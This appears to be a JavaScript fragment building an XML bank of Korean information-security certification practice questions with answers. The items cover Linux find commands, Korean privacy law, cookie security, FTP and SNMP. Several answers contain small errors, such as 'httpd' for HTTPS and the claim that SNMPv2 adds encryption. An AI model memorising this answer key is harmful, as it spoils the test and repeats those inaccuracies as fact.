xml+='  <problem id="343">/home/itwiki/data 폴더에서 최근 5일 이내 변경된 파일을 찾아 /tmp/find.out에 저장하는 명령어를 작성하시오.</problem>';
xml+='  <answer id="343">find /home/itwiki/data -mtime -5 -print &gt; /tmp/find.out&lt;br&gt;&lt;br&gt;또는&lt;br&gt;&lt;br&gt;find /home/itwiki/data -mtime -5 &gt; /tmp/find.out</answer>';
xml+='  <problem id="344">전체 디렉터리에서 정규 파일 중 Set-UID가 설정된 파일을 찾는 명령어를 작성하시오.</problem>';
xml+='  <answer id="344">find / -type f -perm -4000</answer>';
xml+='  <problem id="345">정보공유분석센터의 역할 2가지를 서술하시오.</problem>';
xml+='  <answer id="345">취약점 및 침해요인과 그 대응방안에 관한 정보 제공&lt;br&gt;&lt;br&gt;침해사고가 발생하는 경우 실시간 경보·분석체계 운영</answer>';
xml+='  <problem id="346">정보통신망 이용촉진 및 정보보호 등에 관한 법률의 주관 정부 부처는?</problem>';
xml+='  <answer id="346">과학기술정보통신부, 방송통신위원회</answer>';
xml+='  <problem id="347">정보통신망의 이용을 촉진하고 정보통신서비스를 이용하는 자의 개인정보를 보호함과 아울러 정보통신망을 건전하고 안전하게 이용할 수 있는 환경을 조성하여 국민생활의 향상과 공공복리의 증진에 이바지함을 목적으로 하는 법은?</problem>';
xml+='  <answer id="347">정보통신망 이용촉진 및 정보보호 등에 관한 법률(약칭: 정보통신망법)</answer>';
xml+='  <problem id="348">다음은 개인정보보호법과 정보통신망법에 공통적으로 나오는 "개인정보"의 정의이다. 빈칸에 들어갈 내용을 적으시오.&lt;br&gt;&lt;br&gt;"개인정보"란 생존하는 개인에 관한 정보로서 성명ㆍ주민등록번호 등에 의하여 특정한 개인을 알아볼 수 있는 부호ㆍ문자ㆍ음성ㆍ음향 및 영상 등의 정보(해당 정보만으로는 특정 개인을 알아볼 수 없어도 [    빈칸    ]에는 그 정보를 포함한다)를 말한다.</problem>';
xml+='  <answer id="348">다른 정보와 쉽게 결합하여 알아볼 수 있는 경우</answer>';
xml+='  <problem id="349">정보통신망법에 따라 개인정보의 수집·이용 시에 알리고 동의 받아야 하는 3가지는?</problem>';
xml+='  <answer id="349">1. 개인정보의 수집ㆍ이용 목적&lt;br&gt;&lt;br&gt;2. 수집하는 개인정보의 항목&lt;br&gt;&lt;br&gt;3. 개인정보의 보유ㆍ이용 기간</answer>';
xml+='  <problem id="350">다음은 개인정보 보호법에 따라 개인정보의 수집·이용 시에 알리고 동의 받아야 하는 사항들이다. 괄호에 들어갈 내용은?&lt;br&gt;&lt;br&gt;1. 개인정보의 수집ㆍ이용 목적&lt;br&gt;&lt;br&gt;2. 수집하려는 개인정보의 항목&lt;br&gt;&lt;br&gt;3. 개인정보의 보유 및 이용 기간&lt;br&gt;&lt;br&gt;4. (  괄호  )</problem>';
xml+='  <answer id="350">동의를 거부할 권리가 있다는 사실 및 동의 거부에 따른 불이익이 있는 경우에는 그 불이익의 내용</answer>';
xml+='  <problem id="351">정보통신망법에 의하여 정보통신서비스 제공자는 서비스를 제공하기 위하여 이용자의 단말의 정보 및 기능에 대하여 접근할 수 있는 권한이 필요한 경우 이용자가 명확하게 인지할 수 있도록 알리고 이용자의 동의를 받아야 한다. 다음 각 경우에 대해 알리고 동의 받아야 하는 사항들에 대해 서술하시오.&lt;br&gt;&lt;br&gt;1. 해당 서비스를 제공하기 위하여 반드시 필요한 접근권한인 경우&lt;br&gt;&lt;br&gt;2. 해당 서비스를 제공하기 위하여 반드시 필요한 접근권한이 아닌 경우</problem>';
xml+='  <answer id="351">1. 해당 서비스를 제공하기 위하여 반드시 필요한 접근권한인 경우&lt;br&gt;&lt;br&gt;가. 접근권한이 필요한 정보 및 기능의 항목&lt;br&gt;나. 접근권한이 필요한 이유&lt;br&gt;&lt;br&gt;2. 해당 서비스를 제공하기 위하여 반드시 필요한 접근권한이 아닌 경우&lt;br&gt;&lt;br&gt;가. 접근권한이 필요한 정보 및 기능의 항목&lt;br&gt;나. 접근권한이 필요한 이유&lt;br&gt;다. 접근권한 허용에 대하여 동의하지 아니할 수 있다는 사실</answer>';
xml+='  <problem id="352">다음은 개인정보보호법에 정의된 개인정보보호 원칙에 관한 내용이다. 빈칸에 들어갈 내용을 나열하시오.&lt;br&gt;&lt;br&gt;① 개인정보처리자는 개인정보의 처리 (  괄호1  )을 명확하게 하여야 하고 그 (  괄호1  )에 필요한 범위에서 최소한의 개인정보만을 적법하고 정당하게 수집하여야 한다.&lt;br&gt;&lt;br&gt;② 개인정보처리자는 개인정보의 처리 (  괄호1  )에 필요한 범위에서 (  괄호2  )하게 개인정보를 처리하여야 하며, 그 (  괄호3  )로 활용하여서는 아니 된다.&lt;br&gt;&lt;br&gt;③ 개인정보처리자는 개인정보의 처리 (  괄호1  )에 필요한 범위에서 개인정보의 정확성, 완전성 및 최신성이 보장되도록 하여야 한다.&lt;br&gt;&lt;br&gt;④ 개인정보처리자는 개인정보의 처리 방법 및 종류 등에 따라 (  괄호4  )를 고려하여 개인정보를 (  괄호5  )하게 관리하여야 한다.&lt;br&gt;&lt;br&gt;⑤ 개인정보처리자는 개인정보 처리방침 등 개인정보의 처리에 관한 사항을 (  괄호6  )하여야 하며, 열람청구권 등 정보주체의 권리를 보장하여야 한다.&lt;br&gt;&lt;br&gt;⑥ 개인정보처리자는 정보주체의 (  괄호7  )하는 방법으로 개인정보를 처리하여야 한다.&lt;br&gt;&lt;br&gt;⑦ 개인정보처리자는 개인정보의 (  괄호8  )처리가 가능한 경우에는 (  괄호8  )에 의하여 처리될 수 있도록 하여야 한다.&lt;br&gt;&lt;br&gt;⑧ 개인정보처리자는 이 법 및 관계 법령에서 규정하고 있는 책임과 의무를 준수하고 실천함으로써 정보주체의 (  괄호9  )를 얻기 위하여 노력하여야 한다.</problem>';
xml+='  <answer id="352">① 목적&lt;br&gt;② 적법&lt;br&gt;③ 목적 외 용도&lt;br&gt;④ 정보주체의 권리가 침해받을 가능성과 그 위험 정도&lt;br&gt;⑤ 안전&lt;br&gt;⑥ 공개&lt;br&gt;⑦ 사생활 침해를 최소화&lt;br&gt;⑧ 익명&lt;br&gt;⑨ 신뢰</answer>';
xml+='  <problem id="353">개인정보보호법령에 의거 정보주체의 개인정보를 수집할 수 있는 경우 6가지는?</problem>';
xml+='  <answer id="353">1. 정보주체의 동의를 받은 경우&lt;br&gt;&lt;br&gt;2. 법률에 특별한 규정이 있거나 법령상 의무를 준수하기 위하여 불가피한 경우&lt;br&gt;&lt;br&gt;3. 공공기관이 법령 등에서 정하는 소관 업무의 수행을 위하여 불가피한 경우&lt;br&gt;&lt;br&gt;4. 정보주체와의 계약의 체결 및 이행을 위하여 불가피하게 필요한 경우&lt;br&gt;&lt;br&gt;5. 정보주체 또는 그 법정대리인이 의사표시를 할 수 없는 상태에 있거나 주소불명 등으로 사전 동의를 받을 수 없는 경우로서 명백히 정보주체 또는 제3자의 급박한 생명, 신체, 재산의 이익을 위하여 필요하다고 인정되는 경우&lt;br&gt;&lt;br&gt;6. 개인정보처리자의 정당한 이익을 달성하기 위하여 필요한 경우로서 명백하게 정보주체의 권리보다 우선하는 경우. 이 경우 개인정보처리자의 정당한 이익과 상당한 관련이 있고 합리적인 범위를 초과하지 아니하는 경우에 한한다.</answer>';
xml+='  <problem id="354">다음은 개인정보보호법령에 의거 정보주체의 개인정보를 제3자에게 제공할 수 있는 경우이다. 괄호 안에 들어갈 말은?&lt;br&gt;&lt;br&gt;1. 정보주체의 동의를 받은 경우&lt;br&gt;&lt;br&gt;2. 제15조제1항제2호ㆍ제3호 및 제5호에 따라 (  괄호  )하는 경우</problem>';
xml+='  <answer id="354">개인정보를 수집한 목적 범위에서 개인정보를 제공</answer>';
xml+='  <problem id="355">개인정보보호법령에서 개인정보를 제3자에게 제공하기 위해 동의를 받을 때에는 4가지 사항을 알리고 동의 받아야 한다. 4가지 사항은?</problem>';
xml+='  <answer id="355">1. 개인정보를 제공받는 자&lt;br&gt;&lt;br&gt;2. 개인정보를 제공받는 자의 개인정보 이용 목적&lt;br&gt;&lt;br&gt;3. 제공하는 개인정보의 항목&lt;br&gt;&lt;br&gt;4. 개인정보를 제공받는 자의 개인정보 보유 및 이용 기간</answer>';
xml+='  <problem id="356">다음은 개인정보보호법령에 의거 정보주체의 개인정보를 제3자에게 제공할 수 있는 경우이다. 두번째 경우에서 말하는 제15조제1항의 2호, 3호, 5호의 내용은?&lt;br&gt;&lt;br&gt;1. 정보주체의 동의를 받은 경우&lt;br&gt;&lt;br&gt;2. 제15조제1항제2호ㆍ제3호 및 제5호에 따라 개인정보를 수집한 목적 범위에서 개인정보를 제공하는 경우</problem>';
xml+='  <answer id="356">2. 법률에 특별한 규정이 있거나 법령상 의무를 준수하기 위하여 불가피한 경우&lt;br&gt;&lt;br&gt;3. 공공기관이 법령 등에서 정하는 소관 업무의 수행을 위하여 불가피한 경우&lt;br&gt;&lt;br&gt;5. 정보주체 또는 그 법정대리인이 의사표시를 할 수 없는 상태에 있거나 주소불명 등으로 사전 동의를 받을 수 없는 경우로서 명백히 정보주체 또는 제3자의 급박한 생명, 신체, 재산의 이익을 위하여 필요하다고 인정되는 경우</answer>';
xml+='  <problem id="357">개인정보보호법 및 정보통신망법에서 수집이 금지된 민감정보로 나열된 개인정보를 5가지 이상 입력하시오.</problem>';
xml+='  <answer id="357">아래 중 5개&lt;br&gt;&lt;br&gt;개인정보보호법: 사상ㆍ신념, 노동조합ㆍ정당의 가입ㆍ탈퇴, 정치적 견해, 건강, 성생활 등에 관한 정보, 그 밖에 정보주체의 사생활을 현저히 침해할 우려가 있는 개인정보&lt;br&gt;&lt;br&gt;정보통신망법: 사상, 신념, 가족 및 친인척관계, 학력(學歷)ㆍ병력(病歷), 기타 사회활동 경력 등 개인의 권리ㆍ이익이나 사생활을 뚜렷하게 침해할 우려가 있는 개인정보</answer>';
xml+='  <problem id="358">개인정보는 그 목적에 필요한 최소한의 개인정보를 수집하여야 한다. 이 경우 최소한의 개인정보 수집이라는 입증책임은 누구에게 있는가?</problem>';
xml+='  <answer id="358">개인정보처리자</answer>';
xml+='  <problem id="359">개인정보보호법령에 따라 고유식별정보는 원칙적으로 처리가 금지되어 있다. 예외적으로 고유식별정보 처리를 허용하는 경우를 설명하시오.</problem>';
xml+='  <answer id="359">1. 정보주체에게 제15조제2항 각 호 또는 제17조제2항 각 호의 사항을 알리고 다른 개인정보의 처리에 대한 동의와 별도로 동의를 받은 경우&lt;br&gt;&lt;br&gt;2. 법령에서 구체적으로 고유식별정보의 처리를 요구하거나 허용하는 경우&lt;br&gt;&lt;br&gt;인정 답&lt;br&gt;&lt;br&gt;1. 다른 개인정보의 처리에 대한 동의와 별도로 동의를 받은 경우&lt;br&gt;&lt;br&gt;2. 법령에서 구체적으로 고유식별정보의 처리를 요구하거나 허용하는 경우</answer>';
xml+='  <problem id="360">개인정보보호법 및 정보통신망법에 따라 주민등록번호는 원칙적으로 처리가 금지되어 있다. 예외적으로 고유식별정보 처리를 허용하는 경우를 설명하시오. (개인정보보호법의 내용과 정보통신망법의 내용 둘 중 하나를 적거나 둘을 모두 경우 정답)</problem>';
xml+='  <answer id="360">개인정보보호법&lt;br&gt;&lt;br&gt;1. 법률ㆍ대통령령ㆍ국회규칙ㆍ대법원규칙ㆍ헌법재판소규칙ㆍ중앙선거관리위원회규칙 및 감사원규칙에서 구체적으로 주민등록번호의 처리를 요구하거나 허용한 경우&lt;br&gt;&lt;br&gt;2. 정보주체 또는 제3자의 급박한 생명, 신체, 재산의 이익을 위하여 명백히 필요하다고 인정되는 경우&lt;br&gt;&lt;br&gt;3. 위 두가지 경우에 준하여 주민등록번호 처리가 불가피한 경우로서 행정안전부령으로 정하는 경우&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;정보통신망법&lt;br&gt;&lt;br&gt;1. 본인확인기관으로 지정받은 경우&lt;br&gt;&lt;br&gt;2. 법령에서 이용자의 주민등록번호 수집ㆍ이용을 허용하는 경우&lt;br&gt;&lt;br&gt;3. 영업상 목적을 위하여 이용자의 주민등록번호 수집ㆍ이용이 불가피한 정보통신서비스 제공자로서 방송통신위원회가 고시하는 경우</answer>';
xml+='  <problem id="361">관계법령에 따라 공개된 장소에 영상정보처리기기를 설치하는 경우 안내판을 설치하여 알려야 하는 사항은?</problem>';
xml+='  <answer id="361">1. 설치 목적 및 장소&lt;br&gt;&lt;br&gt;2. 촬영 범위 및 시간&lt;br&gt;&lt;br&gt;3. 관리책임자 성명 및 연락처</answer>';
xml+='  <problem id="362">개인정보처리방침에 포함되어야 하는 내용을 5가지 이상 작성하시오.</problem>';
xml+='  <answer id="362">1. 개인정보의 처리 목적&lt;br&gt;&lt;br&gt;2. 개인정보의 처리 및 보유 기간&lt;br&gt;&lt;br&gt;3. 개인정보의 제3자 제공에 관한 사항(해당되는 경우에만 정한다)&lt;br&gt;&lt;br&gt;4. 개인정보처리의 위탁에 관한 사항(해당되는 경우에만 정한다)&lt;br&gt;&lt;br&gt;5. 정보주체와 법정대리인의 권리ㆍ의무 및 그 행사방법에 관한 사항&lt;br&gt;&lt;br&gt;6. 개인정보 보호책임자의 성명 또는 개인정보 보호업무 및 관련 고충사항을 처리하는 부서의 명칭과 전화번호 등 연락처&lt;br&gt;&lt;br&gt;7. 인터넷 접속정보파일 등 개인정보를 자동으로 수집하는 장치의 설치ㆍ운영 및 그 거부에 관한 사항(해당하는 경우에만 정한다)&lt;br&gt;&lt;br&gt;8. 처리하는 개인정보의 항목(시행령)&lt;br&gt;&lt;br&gt;9. 개인정보의 파기에 관한 사항(시행령)&lt;br&gt;&lt;br&gt;10. 개인정보의 안전성 확보 조치에 관한 사항(시행령)</answer>';
xml+='  <problem id="363">개인정보보호법령에 따라 개인정보 위탁시 계약 문서에 포함되어야 할 내용은?</problem>';
xml+='  <answer id="363">1. 위탁업무 수행 목적 외 개인정보의 처리 금지에 관한 사항&lt;br&gt;&lt;br&gt;2. 개인정보의 기술적ㆍ관리적 보호조치에 관한 사항&lt;br&gt;&lt;br&gt;3. 위탁업무의 목적 및 범위(시행령)&lt;br&gt;&lt;br&gt;4. 재위탁 제한에 관한 사항(시행령)&lt;br&gt;&lt;br&gt;5. 개인정보에 대한 접근 제한 등 안전성 확보 조치에 관한 사항(시행령)&lt;br&gt;&lt;br&gt;6. 위탁업무와 관련하여 보유하고 있는 개인정보의 관리 현황 점검 등 감독에 관한 사항(시행령)&lt;br&gt;&lt;br&gt;7. 수탁자가 준수하여야 할 의무를 위반한 경우의 손해배상 등 책임에 관한 사항(시행령)</answer>';
xml+='  <problem id="364">다음은 개인정보보호법령에서 파기에 관해 규정한 내용이다. 괄호에 들어갈 말은?&lt;br&gt;&lt;br&gt;개인정보처리자는 보유기간의 경과, 개인정보의 처리 목적 달성 등 그 개인정보가 불필요하게 되었을 때에는 지체 없이 그 개인정보를 파기하여야 한다. 다만, ( 괄호 )에는 그러하지 아니하다.</problem>';
xml+='  <answer id="364">다른 법령에 따라 보존하여야 하는 경우</answer>';
xml+='  <problem id="365">다음은 정보통신망법과 다른 법률과의 관계에 관한 조문이다. 다음 빈칸에 들어갈 말을 순서대로 적으시오.&lt;br&gt;&lt;br&gt;정보통신망 이용촉진 및 정보보호등에 관하여는 다른 법률에서 특별히 규정된 경우 외에는 이 법으로 정하는 바에 따른다. 다만, 제4장의 (  빈칸1  )에 관하여 이 법과 「개인정보 보호법」의 적용이 경합하거나 제7장의 (  빈칸2  )에 관하여 이 법과 「전자금융거래법」의 적용이 경합하는 때에는 이 법을 우선 적용한다.</problem>';
xml+='  <answer id="365">개인정보의 보호, 통신과금서비스</answer>';
xml+='  <problem id="366">개인정보보호법 외 다른 법령에서 정한바에 따라 개인정보를 파기하지 않고 보관할 경우 보관 방법에 대해 서술하시오.</problem>';
xml+='  <answer id="366">해당 개인정보 파일은 다른 개인정보와 분리하여서 저장·관리하여야 한다.</answer>';
xml+='  <problem id="367">개인정보보호법에 규정된 개인정보 보호책임자의 권한 및 권리에 대해 설명하시오.</problem>';
xml+='  <answer id="367">개인정보 보호책임자는 법에서 정한 역할을 수행함에 이썽서 필요한 경우 개인정보의 처리 현황, 처리 체계 등에 대하여 수시로 조사하거나 관계 당사자로부터 보고 받을 수 있다.&lt;br&gt;&lt;br&gt;개인정보처리자는 법에서 정한 역할을 수행함에 있어서 정당한 사유 없이 불이익을 받지 않는다.</answer>';
xml+='  <problem id="368">개인정보보호법령에 따라 공공기관에서 수행하는 절차로, 아래의 설명해 해당하는 것은?&lt;br&gt;&lt;br&gt;개인정보를 활용하는 새로운 정보시스템의 도입 및 기존 정보시스템의 중요한 변경 시, 시스템의 구축·운영이 기업의 고객은 물론 국민의 프라이버시에 미칠 영향에 대하여 미리 조사·분석·평가하는 체계적인 절차</problem>';
xml+='  <answer id="368">개인정보 영향평가</answer>';
xml+='  <problem id="369">개인정보 영향평가 의무 대상에 대해 서술하시오.</problem>';
xml+='  <answer id="369">평가 대상&lt;br&gt;&lt;br&gt;- 개인정보를 취급하는 시스템의 신규 구축사업&lt;br&gt;&lt;br&gt;- 개인정보를 취급하는 기존 시스템을 변경하는 사업&lt;br&gt;&lt;br&gt;의무 대상&lt;br&gt;&lt;br&gt;- (5만명 민감 조건) 5만명 이상의 정보주체에 관한 민감정보 또는 고유식별정보의 처리가 수반되는 개인정보파일 구축·운용·변경&lt;br&gt;&lt;br&gt;- (50만명 연계 조건) 다른 개인정보파일과 연계하려고 할때, 연계 결과 50만명 이상의 정보주체에 관한 개인정보가 포함되는 개인정보파일&lt;br&gt;&lt;br&gt;- (100만명 조건) 100만명 이상의 정보주체에 관한 개인정보파일 구축·운용·변경</answer>';
xml+='  <problem id="370">개인정보 영향평가 시점에 대해 약술하시오.</problem>';
xml+='  <answer id="370">개인정보처리 시스템 구축 전단계인 분석 또는 설계 단계에서 실시</answer>';
xml+='  <problem id="371">개인정보 위수탁 처리 과정에서 개인정보보호법령을 위반하여 정보주체에게 손해가 발생한 경우 책임소재에 대해 약술하시오.</problem>';
xml+='  <answer id="371">수탁자가 위탁받은 업무와 관련하여 개인정보를 처리하는 과정에서 이 법을 위반하여 발생한 손해배상책임에 대하여는 수탁자를 개인정보처리자의 소속 직원으로 본다. 따라서 법에 따라 위탁자는 수탁자의 개인정보 처리 과정을 관리·감독 하여야 한다.</answer>';
xml+='  <problem id="372">개인정보보호법령에 따라 개인정보 처리자가 개인정보가 유출되었음을 알게 되었을 때 지체 없이 정보주체에게 알려야 하는 사항을 서술하시오.</problem>';
xml+='  <answer id="372">1. 유출된 개인정보의 항목&lt;br&gt;&lt;br&gt;2. 유출된 시점과 그 경위&lt;br&gt;&lt;br&gt;3. 유출로 인하여 발생할 수 있는 피해를 최소화하기 위하여 정보주체가 할 수 있는 방법 등에 관한 정보&lt;br&gt;&lt;br&gt;4. 개인정보처리자의 대응조치 및 피해 구제절차&lt;br&gt;&lt;br&gt;5. 정보주체에게 피해가 발생한 경우 신고 등을 접수할 수 있는 담당부서 및 연락처</answer>';
xml+='  <problem id="373">개인정보 보호책임자의 직위 요건에 대해 약술하시오. &lt;br&gt;(공공기관인 경우 제외)</problem>';
xml+='  <answer id="373">가. 사업주 또는 대표자&lt;br&gt;나. 임원(임원이 없는 경우에는 개인정보 처리 관련 업무를 담당하는 부서의 장)</answer>';
xml+='  <problem id="374">개인정보보호법령에 따라 개인정보 내부 관리계획에 포함시켜야 &lt;br&gt;할 사항을 서술하시오.</problem>';
xml+='  <answer id="374">1. 개인정보 보호책임자의 지정에 관한 사항&lt;br&gt;&lt;br&gt;2. 개인정보 보호책임자 및 개인정보취급자의 역할 및 책임에 관한 사항&lt;br&gt;&lt;br&gt;3. 개인정보취급자에 대한 교육에 관한 사항&lt;br&gt;&lt;br&gt;4. 접근 권한의 관리에 관한 사항&lt;br&gt;&lt;br&gt;5. 접근 통제에 관한 사항&lt;br&gt;&lt;br&gt;6. 개인정보의 암호화 조치에 관한 사항&lt;br&gt;&lt;br&gt;7. 접속기록 보관 및 점검에 관한 사항&lt;br&gt;&lt;br&gt;8. 악성프로그램 등 방지에 관한 사항&lt;br&gt;&lt;br&gt;9. 물리적 안전조치에 관한 사항&lt;br&gt;&lt;br&gt;10. 개인정보 보호조직에 관한 구성 및 운영에 관한 사항&lt;br&gt;&lt;br&gt;11.개인정보 유출사고 대응 계획 수립·시행에 관한 사항&lt;br&gt;&lt;br&gt;12. 위험도 분석 및 대응방안 마련에 관한 사항&lt;br&gt;&lt;br&gt;13. 재해 및 재난 대비 개인정보처리시스템의 물리적 안전조치에 관한 사항&lt;br&gt;&lt;br&gt;14. 개인정보 처리업무를 위탁하는 경우 수탁자에 대한 관리 및 감독에 관한 사항&lt;br&gt;&lt;br&gt;15. 그 밖에 개인정보 보호를 위하여 필요한 사항</answer>';
xml+='  <problem id="375">개인정보보호법령에 따른 개인정보취급자에 대한 접근 권한 관리 방법을 서술하시오.</problem>';
xml+='  <answer id="375">1. 필요 최소한의 권한 부여&lt;br&gt;&lt;br&gt;2. 인사이동으로 개인정보취급자가 변경된 경우 지체없이 접근권한 변경 및 말소&lt;br&gt;&lt;br&gt;3. 권한 부여 및 말소 내용 기록(3년간 보관)&lt;br&gt;&lt;br&gt;4. 개인정보 처리시스템에 대한 접근 계정은 사용자별로 부여하고 공유할 수 없도록 제한&lt;br&gt;&lt;br&gt;5. 개인정보 처리시스템 계정에 대한 비밀번호 작성규칙 수립&lt;br&gt;&lt;br&gt;6. 개인정보 처리시스템 계정 정보 일정 횟수 이상 오류 시 접근 제한 조치</answer>';
xml+='  <problem id="376">개인정보보호법령에 따라 정보통신망을 통하여 송신하거나 보조저장매체 등을 통하여 전달하는 경우 암호화해야 하는 개인정보는 무엇인가?</problem>';
xml+='  <answer id="376">고유식별정보, 비밀번호, 바이오정보</answer>';
xml+='  <problem id="377">개인정보보호법령에 따른 악성프로그램 방지 방법을 서술하시오.</problem>';
xml+='  <answer id="377">1. 악성프로그램 등을 방지·치료할 수 있는 백신 소프트웨어 등의 보안 프로그램을 설치·운영&lt;br&gt;&lt;br&gt;2. 보안 프로그램의 자동 업데이트 기능을 사용하거나, 일 1회 이상 업데이트를 실시하여 최신성 유지&lt;br&gt;&lt;br&gt;3. 악성프로그램 관련 경보가 발령된 경우 또는 사용 중인 응용 프로그램이나 운영체제 소프트웨어의 제작업체에서 보안 업데이트 공지가 있는 경우 즉시 업데이트&lt;br&gt;&lt;br&gt;4. 발견된 악성프로그램 등에 대해 삭제 등 대응 조치</answer>';
xml+='  <problem id="378">개인정보보호법령에 따른 개인정보처리시스템 접속기록의 보관 및 점검방법에 대해 서술하시오.</problem>';
xml+='  <answer id="378">1. 개인정보취급자가 개인정보처리시스템에 접속한 기록을 1년, 5만명 이상인 경우 2년 이상 보관·관리&lt;br&gt;&lt;br&gt;2. 개인정보의 분실·도난·유출·위조·변조 또는 훼손 등에 대응하기 위하여 개인정보처리시스템의 접속기록 등을 월 1회 이상 점검&lt;br&gt;&lt;br&gt;3. 개인정보취급자의 접속기록이 위·변조 및 도난, 분실되지 않도록 해당 접속기록을 안전하게 보관</answer>';
xml+='  <problem id="379">개인정보보호법령에 따른 관리용 단말기 안전조치에 대해 서술하시오.</problem>';
xml+='  <answer id="379">1. 인가 받지 않은 사람이 관리용 단말기에 접근하여 임의로 조작하지 못하도록 조치&lt;br&gt;&lt;br&gt;2. 본래 목적 외로 사용되지 않도록 조치&lt;br&gt;3. 악성프로그램 감염 방지 등을 위한 보안조치 적용</answer>';
xml+='  <problem id="380">개인정보보호법령에 따른 안전한 개인정보 파기 방법에 대해&lt;br&gt;설명하시오.</problem>';
xml+='  <answer id="380">1. 완전파괴(소각·파쇄 등)&lt;br&gt;2. 전용 소자장비를 이용하여 삭제&lt;br&gt;3. 데이터가 복원되지 않도록 초기화 또는 덮어쓰기 수행</answer>';
xml+='  <problem id="381">HTTP/1.1 버전의 keep-Alive 설정 방법은?</problem>';
xml+='  <answer id="381">httpd.conf 파일에서 &lt;br&gt;keepAlive On, MaxKeepAliveRequest 100 &lt;br&gt;keepAliveTimeout 15 설정을 한다.</answer>';
xml+='  <problem id="382">쿠키 방식은 client가 웹서버에 HTTP 요청하면 서버가 쿠키를 &lt;br&gt;생성하여 보내주고 Client는 그 쿠키를 영속쿠키(파일 형태)/세션&lt;br&gt;쿠키(메모리) 형태로 저장한다. 쿠키 방식의 취약점은?</problem>';
xml+='  <answer id="382">해킹 및 스니핑 공격에 의한 변조와 외부 노출에 취약한 특성이 &lt;br&gt;있다. 쿠키를 사용하려면 암호화를 적용하는게 좋으며, &lt;br&gt;가급적 세션을 사용하는게 좋다.</answer>';
xml+='  <problem id="383">세션은 개별 클라이언트 상태 정보를 서버에 저장하여 &lt;br&gt;쿠키 방식에 비해 보안상 안전하다. &lt;br&gt;하지만 공격자가 세션 ID를 탈취하면 정상 사용자로 위장한 접근이&lt;br&gt;가능하다. 이를 무엇이라 하는가?</problem>';
xml+='  <answer id="383">http session hijacking</answer>';
xml+='  <problem id="384">"Set-cookie 응답 헤더" 에 설정하는 속성으로 클라이언트에서 &lt;br&gt;스크립트를 통해 해당 쿠키에 접근하는 것을 차단해주는 속성은?</problem>';
xml+='  <answer id="384">httponly</answer>';
xml+='  <problem id="385">client에서 httpd 통신일 경우에만 해당 쿠키를 전송하는 속성은?</problem>';
xml+='  <answer id="385">secure</answer>';
xml+='  <problem id="386">HTTP의 주요 요청 메소드는 무엇이 있는가?</problem>';
xml+='  <answer id="386">GET, POST, HEAD, OPTIONS, CONNECT, PUT, TRACE, DELETE</answer>';
xml+='  <problem id="387">FTP 관련 port 번호를 네 가지 이상 적으시오.</problem>';
xml+='  <answer id="387">SFTP: 22번, data channel : 20번,&lt;br&gt;control channel : 21번, FTPS : 990번, TFTP : 69/UDP</answer>';
xml+='  <problem id="388">control channel과 data channel을 다르게 사용하고 &lt;br&gt;데이터 채널을 생성할 때 목적지를 확인하지 않는 FTP 설계의 &lt;br&gt;구조적 취약점을 이용한 공격은? &lt;br&gt;( 네트워크를 스캔하고 FTP서버로 하여금 공격자가 &lt;br&gt;원하는 곳으로 데이터 전송 )</problem>';
xml+='  <answer id="388">FTP Bounce Attack</answer>';
xml+='  <problem id="389">69/UDP 포트를 사용하여 별도의 인증과정 없이 &lt;br&gt;지정된 디렉터리에 접근할 수 있는 보안상 취약점이 존재하는 것은?</problem>';
xml+='  <answer id="389">Trivial FTP</answer>';
xml+='  <problem id="390">FTP 접근 제어 설정 2가지 방법을 쓰시오.</problem>';
xml+='  <answer id="390">ftpusers 파일에 접속할 제한할 계정 명시, &lt;br&gt;TCP Wrapper를 통해 접근 제어 - hosts.allow, hosts.deny</answer>';
xml+='  <problem id="391">TCP/IP기반 네트워크상의 각 호스트로부터 정기적으로 여러 관리 &lt;br&gt;정보를 자동으로 수집하거나 실시간으로 상태를 모니터링 및 &lt;br&gt;설정할 수 있는 서비스는?</problem>';
xml+='  <answer id="391">SNMP</answer>';
xml+='  <problem id="392">application 계층 프로토콜 SNMP의 동작 방식은?</problem>';
xml+='  <answer id="392">Manager(162/udp)가 agent(161/udp)에 필요한 정보를 요청한다.&lt;br&gt;agent는 agent가 설치된 시스템의 정보나 네트워크 정보 등을 &lt;br&gt;수집하여 MIB 형태로 보관, Manager에게 전달해주는 역할을 &lt;br&gt;수행한다.</answer>';
xml+='  <problem id="393">SNMP에서 관리 시스템과 대행자간에 통신하기 위해 일치되어야 하는 것은?</problem>';
xml+='  <answer id="393">SNMP Version, Community String, PDU</answer>';
xml+='  <problem id="394">PDU Type에는 무엇이 있는가?</problem>';
xml+='  <answer id="394">Get Request, Get Next Request, Set Request, Get Response, &lt;br&gt;Trap, (SNMPv2)Get Bulk Request, InformRequest</answer>';
xml+='  <problem id="395">SNMP 데이터 수집 방식은?</problem>';
xml+='  <answer id="395">polling, event reporting</answer>';
xml+='  <problem id="396">SNMP의 주요 용어에 대해 설명하시오.</problem>';
xml+='  <answer id="396">관리 되어야 할 객체들을 모아놓은 집합체를 &lt;br&gt;MIB(Management Information Base)라 한다. &lt;br&gt;또 MIB를 정의하기 위한 일반적인 구조를 SMI(Structure Management Information)라 하며 ASN.1(Abstract Syntax &lt;br&gt;Notation)언어를 사용한다. &lt;br&gt;정의된 모든 객체는 name, syntax, encoding을 가진다. &lt;br&gt;ASN.1의 encoding rule은 BER(Basic Encoding Rules)을 사용한다.</answer>';
xml+='  <problem id="397">SNMP의 버전별 특징은?</problem>';
xml+='  <answer id="397">v1 : 보안기능 x, community string만 일치하면 모든 정보 얻음&lt;br&gt;v2 : 암호화, 해시 기능 추가, 인증기능이 없다.&lt;br&gt;v3:  데이터 인증, 암호 기능 및 재사용 방지, &lt;br&gt;세분화된 접근통제 등 개선된 보안서비스 제공</answer>';
xml+='  <problem id="398">SNMP 데몬과 클라이언트가 데이터를 교환하기 전에 &lt;br&gt;사용하는 일종의 패스워드는 무엇인가? &lt;br&gt;( 초기값이 private 또는 public으로 설정되어 있어 변경해야 한다. )</problem>';
xml+='  <answer id="398">community string</answer>';
xml+='  <problem id="399">SNMPv3 보안서비스는 비인가된 사용자에 의한 데이터의 변경, &lt;br&gt;도청, 재사용 공격에 대응하는 기능을 제공하는 ( )과 인가된 &lt;br&gt;사용자의 MIB 접근 통제 기능을 제공하는 ( )에 의해 제공된다.</problem>';
xml+='  <answer id="399">사용자 기반 보안 모델 ( USM : User Security Model )&lt;br&gt;뷰 기반 접근통제 모델( VACM : View-based Access Control &lt;br&gt;Model )</answer>';
